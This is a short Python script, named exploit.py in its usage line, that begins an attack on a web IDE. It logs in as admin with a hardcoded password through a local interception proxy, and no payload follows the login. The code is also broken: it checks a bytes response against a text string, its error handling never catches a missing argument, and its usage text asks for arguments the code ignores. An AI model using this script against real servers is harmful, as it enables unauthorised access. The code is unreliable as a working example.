#!/usr/bin/env python3
import requests
import sys
import json

session = requests.Session()

def login(url):
    targeturl = url + '/components/user/controller.php?action=authenticate'
    print(targeturl)
    header = {'Upgrade-Insecure-Requests': '1'}
    data = {
        "username": 'admin',
        "password": 'dante1',
        "theme": "default",
        "language": "en"
        }
    proxy = {'http': 'http://127.0.0.1:8080'}
    response = session.post(targeturl, data=data, headers=header, verify=False, proxies=proxy)
    content = response.content
    print(f'[*] Authentication as admin: \n{content}')
    if 'status":"success' in content:
        return True
    

try:
    def main():
        url = sys.argv[1]
#        user = sys.argv[2]
#        passwd = sys.argv[3]
        login(url)
        
except IndexError:
    print('Usage ./exploit.py [url] [user] [pass]')

main()
